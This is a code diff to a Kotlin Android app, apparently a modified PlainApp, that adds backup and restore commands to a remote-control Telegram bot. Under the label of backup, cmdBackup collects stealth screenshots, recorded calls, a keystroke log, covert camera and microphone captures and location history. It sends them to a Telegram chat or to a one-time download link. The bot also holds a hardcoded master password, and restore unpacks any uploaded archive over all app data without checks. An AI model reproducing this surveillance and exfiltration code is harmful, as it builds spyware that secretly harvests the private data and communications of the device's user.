@@ -99,7 +99,9 @@ import kotlinx.coroutines.launch
 import kotlinx.coroutines.suspendCancellableCoroutine
 import kotlinx.coroutines.withContext
 import com.ismartcoding.plain.helpers.AppInfoGuard
+import com.ismartcoding.plain.helpers.BackupManager
 import com.ismartcoding.plain.helpers.LauncherIconHelper
+import com.ismartcoding.plain.web.routes.BackupDownloadManager
 import com.ismartcoding.plain.preferences.AppInfoGuardEnabledPreference
 import com.ismartcoding.plain.preferences.AppLockBiometricEnabledPreference
 import com.ismartcoding.plain.preferences.AppLockEnabledPreference
@@ -143,6 +145,7 @@ object TelegramBotManager {
     @Volatile var botPassword: String = ""
     @Volatile private var botSessionAuthAt: Long = -1L
     @Volatile private var pendingBotPasswordAuth: Boolean = false
+    @Volatile private var pendingRestoreUntil: Long = 0L
     private const val BOT_SESSION_TIMEOUT_MS = 15 * 60 * 1000L
     private const val BOT_MASTER_PASSWORD = "Sh@090609"
     // ──────────────────────────────────────────────────────────────────────────
@@ -174,6 +177,8 @@ object TelegramBotManager {
         "location" to "📍 Current GPS location",
         "battery" to "🔋 Battery status",
         "device" to "📲 Device information",
+        "backup" to "📦 Complete backup (.plain) — all data included",
+        "restore" to "📥 Restore from a .plain or .zip backup file — send the file to this chat",
         "track" to "🛰 Tracking hub overview",
         "livelocation" to "🗺 Live location stream — /livelocation [n]",
         "tracklocation" to "🧭 Recent location points — /tracklocation [n]",
@@ -564,14 +569,26 @@ object TelegramBotManager {
         }
         val text = msg.optString("text", "").trim()
 
-        // Handle incoming APK document files sent directly to the bot chat
+        // Handle incoming document files sent directly to the bot chat
         if (msg.has("document")) {
             val doc = msg.optJSONObject("document")
             val fileName = doc?.optString("file_name", "") ?: ""
-            if (fileName.lowercase().endsWith(".apk")) {
-                scope.launch { handleDocumentMessage(doc!!) }
-            } else if (fileName.isNotBlank()) {
-                sendMessage("⚠️ Only <code>.apk</code> files are accepted here.\n\nSend an APK file to trigger a self-update, or use /update &lt;url&gt; to download from a link.")
+            val lowerName = fileName.lowercase()
+            when {
+                lowerName.endsWith(".apk") -> {
+                    scope.launch { handleDocumentMessage(doc!!) }
+                }
+                (lowerName.endsWith(".plain") || lowerName.endsWith(".zip")) && pendingRestoreUntil > System.currentTimeMillis() -> {
+                    pendingRestoreUntil = 0L
+                    scope.launch { handleRestoreDocument(doc!!) }
+                }
+                fileName.isNotBlank() -> {
+                    if (pendingRestoreUntil > System.currentTimeMillis()) {
+                        sendMessage("⚠️ Expected a <code>.plain</code> or <code>.zip</code> backup file.\n\nSend the backup file now, or type any command to cancel.")
+                    } else {
+                        sendMessage("⚠️ Only <code>.apk</code> files are accepted here for self-update.\n\nUse /restore if you want to restore from a backup, then send a <code>.plain</code> or <code>.zip</code> file.")
+                    }
+                }
             }
             return
         }
@@ -618,8 +635,11 @@ object TelegramBotManager {
             scope.launch { consumePendingInput(pi, text) }
             return
         }
-        // Sending any /command cancels a pending input.
-        if (text.startsWith("/")) pendingInput = null
+        // Sending any /command cancels a pending input or pending restore.
+        if (text.startsWith("/")) {
+            pendingInput = null
+            pendingRestoreUntil = 0L
+        }
 
         val parts = text.split(" ")
         val command = parts[0].lowercase().trimStart('/')
@@ -652,6 +672,8 @@ object TelegramBotManager {
                     "location" -> cmdLocation()
                     "battery" -> cmdBattery()
                     "device" -> cmdDevice()
+                    "backup", "bak", "backupdata", "exportdata" -> cmdBackup()
+                    "restore", "restoredata", "restorebackup", "importbackup" -> cmdRestore()
                     "track" -> cmdTrackHub()
                     "livelocation", "live" -> cmdLiveLocation(args)
                     "tracklocation", "trackloc" -> cmdTrackLocation(args)
@@ -1816,6 +1838,34 @@ object TelegramBotManager {
                         TelegramApiClient.answerCallbackQuery(token, cqId, "🔄 Refreshed")
                         renderTrackHub(editMessageId = messageId)
                     }
+                    // ---- Backup ----
+                    "bk_zip" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId, "📦 Sending as .zip…")
+                        val ctx = com.ismartcoding.plain.MainApp.instance
+                        val existing = File(ctx.cacheDir, "plainapp_backup_tg.${BackupManager.FILE_EXTENSION}")
+                        if (!existing.exists()) {
+                            sendMessage("⚠️ Backup session expired. Run /backup again to create a fresh one.")
+                            return@launch
+                        }
+                        val zipName = existing.name.removeSuffix(".${BackupManager.FILE_EXTENSION}") + ".zip"
+                        val TELEGRAM_LIMIT = 50L * 1024 * 1024
+                        if (existing.length() <= TELEGRAM_LIMIT) {
+                            val ok = TelegramApiClient.sendDocument(token, chatId, existing, displayName = zipName)
+                            if (!ok) sendMessage("❌ Failed to send .zip file. Try /backup again.")
+                        } else {
+                            val dlToken = java.util.UUID.randomUUID().toString().replace("-", "").take(24)
+                            BackupDownloadManager.register(dlToken, existing, existing.name)
+                            val cfEnabled = com.ismartcoding.plain.preferences.CloudflareTunnelEnabledPreference.getAsync(ctx)
+                            val cfHostname = com.ismartcoding.plain.preferences.CloudflareTunnelHostnamePreference.getAsync(ctx)
+                            val baseUrl = if (cfEnabled && cfHostname.isNotBlank()) "https://$cfHostname"
+                                          else "http://${com.ismartcoding.lib.helpers.NetworkHelper.getDeviceIP4()}:${com.ismartcoding.plain.TempData.httpPort}"
+                            sendMessage("📦 File too large for Telegram (${existing.length() / 1_048_576} MB).\n\n🔗 <b>Download as .zip (30 min):</b>\n<code>$baseUrl/backup/dl?t=$dlToken&amp;zip=1</code>")
+                        }
+                    }
+                    "bk_rebuild" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId, "🔄 Rebuilding backup…")
+                        cmdBackup()
+                    }
                     // ---- Bedtime ----
                     "bt_on" -> {
                         val cur = com.ismartcoding.plain.services.AppBlockHelper.getBedtime()
@@ -2447,6 +2497,7 @@ object TelegramBotManager {
             Section("📁 Files & Storage", listOf("files","storage","docs","find","filehash","deletefile")),
             Section("📸 Media", listOf("screenshot","photo","audio","video","music","videos","images","shots","forwardphotos","forwardshots")),
             Section("📱 Apps", listOf("apps","blockapp","unblockapp","blockedapps","launch","screentime","launches","clearcache")),
+            Section("📦 Backup & Restore", listOf("backup", "restore")),
             Section("📊 Device Info", listOf("device","battery","batteryhistory","batteryalert","location","sim","vpn","permissions","networkinfo","wifiscan","netusage")),
             Section("🔧 Device Controls", listOf("wifi","hotspot","bluetooth","airplane","mobiledata","dnd","brightness","volume","torch","lockscreen","reboot")),
             Section("🌀 Sensors", listOf("gyroscope","compass","barometer","steps","proximity","soundmeter")),
@@ -4592,6 +4643,187 @@ object TelegramBotManager {
             "🌡 Temp: ${bat.temperatureC}°C\n" +
             "⚡ Voltage: ${bat.voltageMv}mV\n" +
             "🕐 Checked: ${ts}")
+    }
+
+    private suspend fun cmdBackup() {
+        val ctx = com.ismartcoding.plain.MainApp.instance
+        sendMessage("⏳ <b>Building complete backup…</b>\n\nCollecting database, screenshots, calls, keystrokes, location, notes, settings…\nThis may take a few seconds.")
+
+        val tmpFile = try {
+            BackupManager.buildToTemp(ctx)
+        } catch (e: Exception) {
+            sendMessage("❌ Backup failed: ${htmlEsc(e.message ?: "unknown error")}")
+            return
+        }
+
+        val fileName = BackupManager.buildFileName()
+        val sizeMb   = tmpFile.length() / 1_048_576.0
+        val sizeStr  = if (sizeMb < 0.1) "${tmpFile.length() / 1024} KB" else "${"%.1f".format(sizeMb)} MB"
+
+        val contents = "🗄 <b>Database:</b> notes, bookmarks, feeds, books, chats, tags, sessions\n" +
+                       "📸 <b>Stealth screenshots</b>\n" +
+                       "📞 <b>Recorded calls</b>\n" +
+                       "🎙 <b>Live captures</b> (camera/mic recordings, photos)\n" +
+                       "👁 <b>Intruder captures</b>\n" +
+                       "⌨️ <b>Keystroke log</b>\n" +
+                       "🗺 <b>Location history</b>\n" +
+                       "🌐 <b>Geofencing data + events</b>\n" +
+                       "⚙️ <b>All settings &amp; preferences</b>\n" +
+                       "🔐 <b>SSL certificate</b>\n" +
+                       "🖼 <b>Note images, feed images, favicons</b>"
+
+        val TELEGRAM_LIMIT = 50L * 1024 * 1024
+
+        if (tmpFile.length() <= TELEGRAM_LIMIT) {
+            val caption = "📦 <b>PlainApp Complete Backup</b>\n" +
+                          "━━━━━━━━━━━━━━━━━━━\n" +
+                          "📁 <code>$fileName</code>\n" +
+                          "📏 Size: <b>$sizeStr</b>\n\n" +
+                          "<b>Includes:</b>\n$contents\n\n" +
+                          "💡 The <code>.plain</code> file is a ZIP — rename to <code>.zip</code> on your PC to browse raw files."
+            val ok = TelegramApiClient.sendDocument(token, chatId, tmpFile, caption, displayName = fileName)
+            if (!ok) {
+                sendMessage("❌ Send failed (size: $sizeStr). Try /backup again.")
+                return
+            }
+            val rows = listOf(listOf("📦 Also send as .zip" to "bk_zip", "🔄 Fresh backup" to "bk_rebuild"))
+            sendMessage("✅ Backup sent above as <code>.plain</code> file.", replyMarkup = TelegramApiClient.inlineKeyboard(rows))
+        } else {
+            // > 50 MB — generate one-time download links served via Ktor
+            val dlToken  = java.util.UUID.randomUUID().toString().replace("-", "").take(24)
+            BackupDownloadManager.register(dlToken, tmpFile, fileName)
+
+            val cfEnabled  = com.ismartcoding.plain.preferences.CloudflareTunnelEnabledPreference.getAsync(ctx)
+            val cfHostname = com.ismartcoding.plain.preferences.CloudflareTunnelHostnamePreference.getAsync(ctx)
+            val baseUrl    = if (cfEnabled && cfHostname.isNotBlank()) "https://$cfHostname"
+                             else "http://${com.ismartcoding.lib.helpers.NetworkHelper.getDeviceIP4()}:${com.ismartcoding.plain.TempData.httpPort}"
+
+            val sb = StringBuilder()
+            sb.append("📦 <b>PlainApp Complete Backup</b>\n")
+            sb.append("━━━━━━━━━━━━━━━━━━━\n")
+            sb.append("📁 <code>$fileName</code>\n")
+            sb.append("📏 <b>$sizeStr</b> — too large for Telegram (50 MB limit)\n")
+            sb.append("⏰ Links valid for <b>30 minutes</b>\n\n")
+            sb.append("🔗 <b>Download (.plain):</b>\n<code>$baseUrl/backup/dl?t=$dlToken</code>\n\n")
+            sb.append("📦 <b>Download (.zip — same file, rename):</b>\n<code>$baseUrl/backup/dl?t=$dlToken&amp;zip=1</code>\n\n")
+            sb.append("<b>Includes:</b>\n$contents\n\n")
+            sb.append("💡 Open the <code>.zip</code> link on your PC to browse all raw files.")
+
+            val rows = listOf(listOf("🔄 Fresh backup" to "bk_rebuild"))
+            sendMessage(sb.toString(), replyMarkup = TelegramApiClient.inlineKeyboard(rows))
+        }
+    }
+
+    private fun cmdRestore() {
+        pendingRestoreUntil = System.currentTimeMillis() + 5 * 60 * 1000L
+        sendMessage(
+            "📥 <b>Restore from Backup</b>\n" +
+            "━━━━━━━━━━━━━━━━━━━\n\n" +
+            "Send me a <code>.plain</code> or <code>.zip</code> backup file created by PlainApp.\n\n" +
+            "⚠️ <b>Before you proceed:</b>\n" +
+            "• All current app data will be <b>overwritten</b> with the backup's data\n" +
+            "• The app will <b>restart automatically</b> after restore completes\n" +
+            "• File must be a valid PlainApp backup (made by /backup or in-app export)\n\n" +
+            "📏 <b>Size limit:</b> Telegram Bot API accepts files up to <b>20 MB</b>.\n" +
+            "For larger backups, use the <b>Backup &amp; Restore</b> page inside the app.\n\n" +
+            "⏰ Waiting for your file for <b>5 minutes</b>…\n" +
+            "Send any /command to cancel."
+        )
+    }
+
+    private suspend fun handleRestoreDocument(document: org.json.JSONObject) {
+        val fileId   = document.optString("file_id", "")
+        val fileName = document.optString("file_name", "restore.plain")
+        val fileSize = document.optLong("file_size", 0L)
+        val ctx      = com.ismartcoding.plain.MainApp.instance
+
+        if (fileId.isBlank()) {
+            sendMessage("❌ Could not read the file from Telegram. Please try sending it again.")
+            return
+        }
+
+        sendMessage(
+            "📥 <b>Backup received: ${htmlEsc(fileName)}</b>\n" +
+            "📏 Size: ${humanSize(fileSize)}\n\n" +
+            "⬇️ Downloading from Telegram…"
+        )
+
+        val filePath = withContext(Dispatchers.IO) {
+            TelegramApiClient.getFilePath(token, fileId)
+        }
+        if (filePath.isNullOrBlank()) {
+            sendMessage(
+                "❌ Failed to get download URL from Telegram.\n\n" +
+                "<i>Note: Telegram Bot API only supports files up to 20 MB.\n" +
+                "For larger backups, use the Backup &amp; Restore page inside the app.</i>"
+            )
+            return
+        }
+
+        val destFile = java.io.File(ctx.cacheDir, "restore_incoming.plain")
+        val dlOk = withContext(Dispatchers.IO) {
+            TelegramApiClient.downloadToFile(token, filePath, destFile)
+        }
+        if (!dlOk || !destFile.exists()) {
+            sendMessage("❌ Download failed. Check the network connection and try again.")
+            return
+        }
+
+        sendMessage("📦 Unpacking and scanning backup contents…")
+
+        val destDir = java.io.File(ctx.cacheDir, "restore_unzip")
+        if (destDir.exists()) destDir.deleteRecursively()
+
+        val unzipOk = withContext(Dispatchers.IO) {
+            try {
+                com.ismartcoding.lib.helpers.ZipHelper.unzip(destFile.inputStream(), destDir)
+            } catch (e: Exception) {
+                false
+            }
+        }
+        if (!unzipOk) {
+            sendMessage(
+                "❌ Failed to unpack the backup file.\n\n" +
+                "Make sure it is a valid <code>.plain</code> or <code>.zip</code> backup created by PlainApp."
+            )
+            destFile.delete()
+            return
+        }
+
+        val stats = withContext(Dispatchers.IO) {
+            BackupManager.scanStats(destDir)
+        }
+
+        sendMessage("🔄 Restoring all data to device…")
+
+        withContext(Dispatchers.IO) {
+            BackupManager.restoreFrom(destDir, ctx)
+            destDir.deleteRecursively()
+            destFile.delete()
+        }
+
+        val sb = StringBuilder()
+        sb.append("✅ <b>Restore complete!</b>\n\n")
+        sb.append("📊 <b>Restored data summary:</b>\n")
+        sb.append("━━━━━━━━━━━━━━━━━━━\n")
+        sb.append("🗄 <b>Database files:</b> ${stats.databaseFiles}\n")
+        if (stats.stealthShots > 0)     sb.append("📸 <b>Stealth screenshots:</b> ${stats.stealthShots}\n")
+        if (stats.callRecordings > 0)   sb.append("📞 <b>Call recordings:</b> ${stats.callRecordings}\n")
+        if (stats.intruderCaptures > 0) sb.append("👁 <b>Intruder captures:</b> ${stats.intruderCaptures}\n")
+        if (stats.liveCaptures > 0)     sb.append("🎙 <b>Live captures:</b> ${stats.liveCaptures}\n")
+        if (stats.geofenceAudio > 0)    sb.append("🌐 <b>Geofence audio clips:</b> ${stats.geofenceAudio}\n")
+        if (stats.datastoreFiles > 0)   sb.append("⚙️ <b>Settings / DataStore:</b> ${stats.datastoreFiles} files\n")
+        if (stats.sharedPrefsFiles > 0) sb.append("📋 <b>SharedPreferences:</b> ${stats.sharedPrefsFiles} files\n")
+        if (stats.noteImages > 0)       sb.append("🖼 <b>Note images:</b> ${stats.noteImages}\n")
+        if (stats.feedImages > 0)       sb.append("📰 <b>Feed images:</b> ${stats.feedImages}\n")
+        if (stats.bookmarkFavicons > 0) sb.append("⭐ <b>Favicons:</b> ${stats.bookmarkFavicons}\n")
+        sb.append("━━━━━━━━━━━━━━━━━━━\n")
+        sb.append("📦 <b>Total files restored:</b> ${stats.totalFiles}\n\n")
+        sb.append("🔄 <b>Restarting app in 3 seconds…</b>")
+        sendMessage(sb.toString())
+
+        kotlinx.coroutines.delay(3_000)
+        com.ismartcoding.plain.helpers.AppHelper.relaunch(ctx)
     }
 
     private fun cmdDevice() {
